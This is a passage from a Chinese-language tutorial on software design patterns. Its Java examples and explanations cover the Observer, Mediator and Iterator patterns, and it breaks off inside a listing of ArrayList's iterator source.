<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WeixinUser</span> <span class="keyword">implements</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 微信用户名</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WeixinUser</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;-&quot;</span> + message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义抽象主题类，提供了attach、detach、notify三个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line">    <span class="comment">//增加订阅者</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">attach</span><span class="params">(Observer observer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除订阅者</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">detach</span><span class="params">(Observer observer)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//通知订阅者更新消息</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">notify</span><span class="params">(String message)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>微信公众号是具体主题（具体被观察者），里面存储了订阅该公众号的微信用户，并实现了抽象主题中的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SubscriptionSubject</span> <span class="keyword">implements</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line">    <span class="comment">//储存订阅公众号的微信用户</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Observer&gt; weixinUserlist = <span class="keyword">new</span> ArrayList&lt;Observer&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">attach</span><span class="params">(Observer observer)</span> </span>&#123;</span><br><span class="line">        weixinUserlist.add(observer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">detach</span><span class="params">(Observer observer)</span> </span>&#123;</span><br><span class="line">        weixinUserlist.remove(observer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">notify</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Observer observer : weixinUserlist) &#123;</span><br><span class="line">            observer.update(message);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端程序</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SubscriptionSubject mSubscriptionSubject=<span class="keyword">new</span> SubscriptionSubject();</span><br><span class="line">        <span class="comment">//创建微信用户</span></span><br><span class="line">        WeixinUser user1=<span class="keyword">new</span> WeixinUser(<span class="string">&quot;孙悟空&quot;</span>);</span><br><span class="line">        WeixinUser user2=<span class="keyword">new</span> WeixinUser(<span class="string">&quot;猪悟能&quot;</span>);</span><br><span class="line">        WeixinUser user3=<span class="keyword">new</span> WeixinUser(<span class="string">&quot;沙悟净&quot;</span>);</span><br><span class="line">        <span class="comment">//订阅公众号</span></span><br><span class="line">        mSubscriptionSubject.attach(user1);</span><br><span class="line">        mSubscriptionSubject.attach(user2);</span><br><span class="line">        mSubscriptionSubject.attach(user3);</span><br><span class="line">        <span class="comment">//公众号更新发出消息给订阅的微信用户</span></span><br><span class="line">        mSubscriptionSubject.notify(<span class="string">&quot;传智黑马的专栏更新了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="优缺点-1"><a href="#优缺点-1" class="headerlink" title="优缺点"></a>优缺点</h5><ul>
<li><p><strong>优点：</strong></p>
<ul>
<li><p>降低了目标与观察者之间的耦合关系，两者之间是抽象耦合关系。</p>
</li>
<li><p>被观察者发送通知，所有注册的观察者都会收到信息【<strong>可以实现广播机制</strong>】</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p><strong>缺点：</strong></p>
<ul>
<li><p>如果观察者非常多的话，那么所有的观察者收到被观察者发送的通知会耗时（<strong>使用多线程改进</strong>）</p>
</li>
<li><p>如果被观察者有循环依赖的话，那么被观察者发送通知会使观察者循环调用，会导致系统崩溃</p>
</li>
</ul>
</li>
</ul>
<p><strong>使用场景</strong></p>
<ul>
<li>对象间存在一对多关系，一个对象的状态发生改变会影响其他对象。</li>
<li>当一个抽象模型有两个方面，其中一个方面依赖于另一方面时。</li>
</ul>
<h5 id="JDK中提供的实现"><a href="#JDK中提供的实现" class="headerlink" title="JDK中提供的实现"></a>JDK中提供的实现</h5><p>在 Java 中，通过 <code>java.util.Observable</code> 类和 <code>java.util.Observer</code> 接口定义了观察者模式，只要实现它们的子类就可以编写观察者模式实例。</p>
<p><strong>1，<code>Observable</code>类</strong></p>
<p>Observable 类是抽象目标类（被观察者），它有一个 Vector 集合成员变量，用于保存所有要通知的观察者对象，下面来介绍它最重要的 3 个方法。</p>
<ul>
<li><p><code>void addObserver(Observer o)</code> 方法：用于将新的观察者对象添加到集合中。</p>
</li>
<li><p><code>void notifyObservers(Object arg) </code>方法：调用集合中的所有观察者对象的 update方法，通知它们数据发生改变。通常越晚加入集合的观察者越先得到通知。</p>
</li>
<li><p><code>void setChange() </code>方法：用来设置一个 boolean 类型的内部标志，注明目标对象发生了变化。当它为true时，notifyObservers() 才会通知观察者。</p>
</li>
</ul>
<p><strong>2，<code>Observer</code>接口</strong></p>
<p>Observer 接口是抽象观察者，它监视目标对象的变化，当目标对象发生变化时，观察者得到通知，并调用 update 方法，进行相应的工作。</p>
<p>【例】警察抓小偷</p>
<p>警察抓小偷也可以使用观察者模式来实现，警察是观察者，小偷是被观察者。代码如下：</p>
<p>小偷是一个被观察者，所以需要继承Observable类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Thief</span> <span class="keyword">extends</span> <span class="title">Observable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Thief</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">steal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;小偷：我偷东西了，有没有人来抓我！！！&quot;</span>);</span><br><span class="line">        <span class="keyword">super</span>.setChanged(); <span class="comment">//changed  = true</span></span><br><span class="line">        <span class="keyword">super</span>.notifyObservers();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>警察是一个观察者，所以需要让其实现Observer接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Policemen</span> <span class="keyword">implements</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Policemen</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(Observable o, Object arg)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;警察：&quot;</span> + ((Thief) o).getName() + <span class="string">&quot;，我已经盯你很久了，你可以保持沉默，但你所说的将成为呈堂证供！！！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建小偷对象</span></span><br><span class="line">        Thief t = <span class="keyword">new</span> Thief(<span class="string">&quot;隔壁老王&quot;</span>);</span><br><span class="line">        <span class="comment">//创建警察对象</span></span><br><span class="line">        Policemen p = <span class="keyword">new</span> Policemen(<span class="string">&quot;小李&quot;</span>);</span><br><span class="line">        <span class="comment">//让警察盯着小偷</span></span><br><span class="line">        t.addObserver(p);</span><br><span class="line">        <span class="comment">//小偷偷东西</span></span><br><span class="line">        t.steal();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="中介者模式"><a href="#中介者模式" class="headerlink" title="中介者模式"></a>中介者模式</h4><p><strong>概述</strong></p>
<p>一般来说，同事类之间的关系是比较复杂的，多个同事类之间互相关联时，他们之间的关系会呈现为复杂的网状结构，这是一种过度耦合的架构，即不利于类的复用，也不稳定。例如在下左图中，有六个同事类对象，假如对象1发生变化，那么将会有4个对象受到影响。如果对象2发生变化，那么将会有5个对象受到影响。也就是说，同事类之间直接关联的设计是不好的。</p>
<p>如果引入中介者模式，那么同事类之间的关系将变为星型结构，从下右图中可以看到，任何一个类的变动，只会影响的类本身，以及中介者，这样就减小了系统的耦合。一个好的设计，必定不会把所有的对象关系处理逻辑封装在本类中，而是使用一个专门的类来管理那些不属于自己的行为。</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-26-14-42-09.png" style="zoom:60%;" />

<p><strong>定义：</strong></p>
<p>又叫调停模式，定义一个中介角色来封装一系列对象之间的交互，使原有对象之间的耦合松散，且可以独立地改变它们之间的交互。</p>
<p><strong>结构</strong></p>
<p>中介者模式包含以下主要角色：</p>
<ul>
<li><p>抽象中介者（Mediator）角色：它是中介者的接口，提供了同事对象注册与转发同事对象信息的抽象方法。</p>
</li>
<li><p>具体中介者（ConcreteMediator）角色：实现中介者接口，定义一个 List 来管理同事对象，协调各个同事角色之间的交互关系，因此它依赖于同事角色。</p>
</li>
<li><p>抽象同事类（Colleague）角色：定义同事类的接口，保存中介者对象，提供同事对象交互的抽象方法，实现所有相互影响的同事类的公共功能。</p>
</li>
<li><p>具体同事类（Concrete Colleague）角色：是抽象同事类的实现者，当需要与其他同事对象交互时，由中介者对象负责后续的交互。</p>
</li>
</ul>
<h5 id="案例实现-6"><a href="#案例实现-6" class="headerlink" title="案例实现"></a>案例实现</h5><p>【例】租房</p>
<p>现在租房基本都是通过房屋中介，房主将房屋托管给房屋中介，而租房者从房屋中介获取房屋信息。房屋中介充当租房者与房屋所有者之间的中介者。</p>
<p>类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-26-14-47-44.png" style="zoom:70%;" />

<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//抽象中介者</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Mediator</span> </span>&#123;</span><br><span class="line">    <span class="comment">//申明一个联络方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">constact</span><span class="params">(String message,Person person)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//抽象同事类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> Mediator mediator;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name,Mediator mediator)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.mediator = mediator;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//具体同事类 房屋拥有者</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HouseOwner</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HouseOwner</span><span class="params">(String name, Mediator mediator)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(name, mediator);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//与中介者联系</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">constact</span><span class="params">(String message)</span></span>&#123;</span><br><span class="line">        mediator.constact(message, <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取信息</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getMessage</span><span class="params">(String message)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;房主&quot;</span> + name +<span class="string">&quot;获取到的信息：&quot;</span> + message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//具体同事类 承租人</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tenant</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tenant</span><span class="params">(String name, Mediator mediator)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(name, mediator);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//与中介者联系</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">constact</span><span class="params">(String message)</span></span>&#123;</span><br><span class="line">        mediator.constact(message, <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取信息</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getMessage</span><span class="params">(String message)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;租房者&quot;</span> + name +<span class="string">&quot;获取到的信息：&quot;</span> + message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中介机构</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MediatorStructure</span> <span class="keyword">extends</span> <span class="title">Mediator</span> </span>&#123;</span><br><span class="line">    <span class="comment">//首先中介结构必须知道所有房主和租房者的信息</span></span><br><span class="line">    <span class="keyword">private</span> HouseOwner houseOwner;</span><br><span class="line">    <span class="keyword">private</span> Tenant tenant;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> HouseOwner <span class="title">getHouseOwner</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> houseOwner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHouseOwner</span><span class="params">(HouseOwner houseOwner)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.houseOwner = houseOwner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tenant <span class="title">getTenant</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tenant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTenant</span><span class="params">(Tenant tenant)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.tenant = tenant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">constact</span><span class="params">(String message, Person person)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (person == houseOwner) &#123;          <span class="comment">//如果是房主，则租房者获得信息</span></span><br><span class="line">            tenant.getMessage(message);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;       <span class="comment">//反正则是房主获得信息</span></span><br><span class="line">            houseOwner.getMessage(message);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//一个房主、一个租房者、一个中介机构</span></span><br><span class="line">        MediatorStructure mediator = <span class="keyword">new</span> MediatorStructure();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//房主和租房者只需要知道中介机构即可</span></span><br><span class="line">        HouseOwner houseOwner = <span class="keyword">new</span> HouseOwner(<span class="string">&quot;张三&quot;</span>, mediator);</span><br><span class="line">        Tenant tenant = <span class="keyword">new</span> Tenant(<span class="string">&quot;李四&quot;</span>, mediator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//中介结构要知道房主和租房者</span></span><br><span class="line">        mediator.setHouseOwner(houseOwner);</span><br><span class="line">        mediator.setTenant(tenant);</span><br><span class="line"></span><br><span class="line">        tenant.constact(<span class="string">&quot;需要租三室的房子&quot;</span>);</span><br><span class="line">        houseOwner.constact(<span class="string">&quot;我这有三室的房子，你需要租吗？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>优缺点</strong></p>
<ul>
<li><p> <strong>优点：</strong></p>
</li>
<li><p>松散耦合</p>
<p>中介者模式通过把多个同事对象之间的交互封装到中介者对象里面，从而使得同事对象之间松散耦合，基本上可以做到互补依赖。这样一来，同事对象就可以独立地变化和复用，而不再像以前那样“牵一处而动全身”了。</p>
</li>
</ul>
<ul>
<li><p>集中控制交互</p>
<p>多个同事对象的交互，被封装在中介者对象里面集中管理，使得这些交互行为发生变化的时候，只需要修改中介者对象就可以了，当然如果是已经做好的系统，那么就扩展中介者对象，而各个同事类不需要做修改。</p>
</li>
</ul>
<ul>
<li>一对多关联转变为一对一的关联<br>没有使用中介者模式的时候，同事对象之间的关系通常是一对多的，引入中介者对象以后，中介者对象和同事对象的关系通常变成双向的一对一，这会让对象的关系更容易理解和实现。</li>
</ul>
<ul>
<li><strong>缺点：</strong><ul>
<li>当同事类太多时，中介者的职责将很大，它会变得复杂而庞大，以至于系统难以维护。</li>
</ul>
</li>
</ul>
<h5 id="使用场景-5"><a href="#使用场景-5" class="headerlink" title="使用场景"></a>使用场景</h5><ul>
<li>系统中对象之间存在复杂的引用关系，系统结构混乱且难以理解。</li>
<li>当想创建一个<strong>运行于多个类之间</strong>的对象，又不想生成新的子类时。</li>
</ul>
<h4 id="迭代器模式"><a href="#迭代器模式" class="headerlink" title="迭代器模式"></a>迭代器模式</h4><p><strong>定义：</strong></p>
<p>提供一个对象来顺序访问聚合对象中的一系列数据，而不暴露聚合对象的内部表示。 </p>
<p><strong>结构</strong></p>
<p>迭代器模式主要包含以下角色：</p>
<ul>
<li><p>抽象聚合（Aggregate）角色：定义存储、添加、删除聚合元素以及创建迭代器对象的接口。</p>
</li>
<li><p>具体聚合（ConcreteAggregate）角色：实现抽象聚合类，返回一个具体迭代器的实例。</p>
</li>
<li><p>抽象迭代器（Iterator）角色：定义访问和遍历聚合元素的接口，通常包含 hasNext()、next() 等方法。</p>
</li>
<li><p>具体迭代器（Concretelterator）角色：实现抽象迭代器接口中所定义的方法，完成对聚合对象的遍历，记录遍历的当前位置。</p>
</li>
</ul>
<h5 id="案例实现-7"><a href="#案例实现-7" class="headerlink" title="案例实现"></a>案例实现</h5><p>【例】定义一个可以存储学生对象的容器对象，将遍历该容器的功能交由迭代器实现，涉及到的类如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-26-15-08-50.png" style="zoom:90%;" />

<p>代码如下：</p>
<p>定义迭代器接口，声明hasNext、next方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">StudentIterator</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">Student <span class="title">next</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义具体的迭代器类，重写所有的抽象方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentIteratorImpl</span> <span class="keyword">implements</span> <span class="title">StudentIterator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Student&gt; list;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> position = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StudentIteratorImpl</span><span class="params">(List&lt;Student&gt; list)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.list = list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> position &lt; list.size();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Student <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Student currentStudent = list.get(position);</span><br><span class="line">        position ++;</span><br><span class="line">        <span class="keyword">return</span> currentStudent;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义抽象容器类，包含添加元素，删除元素，获取迭代器对象的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">StudentAggregate</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addStudent</span><span class="params">(Student student)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">removeStudent</span><span class="params">(Student student)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">StudentIterator <span class="title">getStudentIterator</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义具体的容器类，重写所有的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentAggregateImpl</span> <span class="keyword">implements</span> <span class="title">StudentAggregate</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;Student&gt; list = <span class="keyword">new</span> ArrayList&lt;Student&gt;();  <span class="comment">// 学生列表</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addStudent</span><span class="params">(Student student)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.list.add(student);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeStudent</span><span class="params">(Student student)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.list.remove(student);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> StudentIterator <span class="title">getStudentIterator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> StudentIteratorImpl(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>优缺点</strong></p>
<ul>
<li><p><strong>优点：</strong></p>
<ul>
<li><p>它支持以不同的方式遍历一个聚合对象，在同一个聚合对象上可以定义多种遍历方式。在迭代器模式中只需要用一个不同的迭代器来替换原有迭代器即可改变遍历算法，我们也可以自己定义迭代器的子类以支持新的遍历方式。</p>
</li>
<li><p>迭代器简化了聚合类。由于引入了迭代器，在原有的聚合对象中不需要再自行提供数据遍历等方法，这样可以简化聚合类的设计。</p>
</li>
<li><p>在迭代器模式中，由于引入了抽象层，增加新的聚合类和迭代器类都很方便，无须修改原有代码，<strong>满足 “开闭原则” 的要求</strong>。</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><strong>缺点：</strong><ul>
<li>增加了类的个数，这在一定程度上增加了系统的复杂性。</li>
</ul>
</li>
</ul>
<p><strong>使用场景</strong></p>
<ul>
<li>当需要为聚合对象提供多种遍历方式时。</li>
<li>当需要为遍历不同的聚合结构提供一个统一的接口时。</li>
<li>当访问一个聚合对象的内容而无须暴露其内部细节的表示时。</li>
</ul>
<h5 id="JDK源码解析-6"><a href="#JDK源码解析-6" class="headerlink" title="JDK源码解析"></a>JDK源码解析</h5><p>迭代器模式在JAVA的很多集合类中被广泛应用，接下来看看JAVA源码中是如何使用迭代器模式的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">Iterator&lt;String&gt; iterator = list.iterator(); <span class="comment">//list.iterator()方法返回的肯定是Iterator接口的子实现类对象</span></span><br><span class="line"><span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">    System.out.println(iterator.next());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看完这段代码是不是很熟悉，与我们上面代码基本类似。单列集合都使用到了迭代器，我们以ArrayList举例来说明</p>
<ul>
<li>List：抽象聚合类</li>
<li>ArrayList：具体的聚合类</li>
<li>Iterator：抽象迭代器</li>
<li>list.iterator()：返回的是实现了 <code>Iterator</code> 接口的具体迭代器对象</li>
</ul>
<p>具体的来看看 ArrayList的代码实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayList</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractList</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">List</span>&lt;<span class="title">E</span>&gt;, <span class="title">RandomAccess</span>, <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title">iterator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Itr();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Itr</span> <span class="keyword">implements</span> <span 